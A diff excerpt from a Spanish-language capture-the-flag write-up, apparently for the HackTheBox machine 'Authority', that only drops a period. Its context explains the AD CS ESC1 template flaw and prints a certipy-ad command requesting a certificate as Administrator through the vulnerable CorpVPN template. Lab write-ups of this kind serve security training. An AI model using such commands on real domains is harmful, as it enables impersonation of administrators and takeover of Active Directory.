@@ -1143,7 +1143,7 @@ CLOCK: time stepped by 14400.157112
 ```
 
 `ESC1` ocurre cuando una `plantilla` de `certificado` permite la `autenticación` de `cliente` y permite al solicitante proporcionar un `Nombre Alternativo del Sujeto (SAN)` arbitrario.
-Para `ESC1`, podemos `solicitar` un `certificado` basado en la `plantilla` de `certificado vulnerable` y especificar un `UPN` o un `SAN DNS` arbitrario con los parámetros `-upn` y `-dns`, respectivamente.
+Para `ESC1`, podemos `solicitar` un `certificado` basado en la `plantilla` de `certificado vulnerable` y especificar un `UPN` o un `SAN DNS` arbitrario con los parámetros `-upn` y `-dns`, respectivamente
 
 ```
 # certipy-ad req -u 'TEST$' -p 'password' -ca authority-CA -target authority.authority.htb -dc-ip 10.129.229.56 -dns authority.htb -template CorpVPN -upn Administrator@authority.htb  
